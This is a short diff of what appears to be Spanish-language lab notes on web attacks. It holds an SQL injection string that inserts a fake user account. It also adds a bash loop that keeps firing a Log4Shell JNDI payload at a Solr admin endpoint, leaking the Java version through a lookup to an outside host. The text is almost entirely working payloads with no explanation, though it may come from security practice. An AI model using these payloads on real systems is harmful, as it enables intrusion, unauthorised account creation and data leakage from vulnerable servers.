@@ -32,3 +32,11 @@ ATAQUE WEB
 ----------
 
 usuario';INSERT INTO usuarios (nombre_usuario, password) VALUES ('userfake','12345678'); -- '
+
+
+
+
+
+LOÇG4J
+
+while true; do curl --get --data-urlencode 'action=${jndi:ldap://${sys:java.version}.example.com}' http://log4j-victim.default.svc:8983/solr/admin/cores; sleep  $((RANDOM % 15)); done
